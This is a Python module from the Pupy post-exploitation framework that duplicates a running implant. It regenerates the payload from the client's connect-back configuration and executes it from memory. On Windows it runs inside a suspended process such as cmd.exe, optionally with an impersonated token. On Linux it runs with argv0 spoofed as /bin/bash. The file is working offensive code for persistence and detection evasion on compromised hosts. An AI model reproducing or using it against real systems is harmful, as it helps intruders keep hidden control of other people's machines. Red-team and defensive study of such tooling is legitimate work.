# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from modules.lib.windows.memory_exec import exec_pe
from modules.lib.linux.exec_elf import mexec
import pupygen

__class_name__="MemoryDuplicate"

@config(compatibilities=["windows", "linux"], category="manage")
class MemoryDuplicate(PupyModule):
    """
        Duplicate the current pupy payload by executing it from memory
    """
    interactive = 1
    dependencies = {
        'linux': ['memexec'],
        'windows': ['pupymemexec', 'pupwinutils.memexec', 'pupwinutils.processes']
    }

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="duplicate", description=cls.__doc__)
        cls.arg_parser.add_argument('-p', '--process', default='cmd.exe', help='process to start suspended')
        cls.arg_parser.add_argument('-m', '--impersonate', action='store_true', help='use the current impersonated token (to use with impersonate module)')

    def run(self, args):
        self.success("looking for configured connect back address ...")
        payload, tpl, _ = pupygen.generate_binary_from_template(
            self.log,
            self.client.get_conf(),
            self.client.desc['platform'],
            arch=self.client.arch
        )
        self.success("Generating the payload with the current config from {} - size={}".format(tpl, len(payload)))
        self.success("Executing the payload from memory ...")
        if self.client.is_windows():
            exec_pe(
                self, "", raw_pe=payload, interactive=False,
                use_impersonation=args.impersonate, suspended_process=args.process,
                wait=False
            )
        elif self.client.is_linux():
            mexec(self, payload, [], argv0='/bin/bash', raw=True)

        self.success("pupy payload executed from memory")
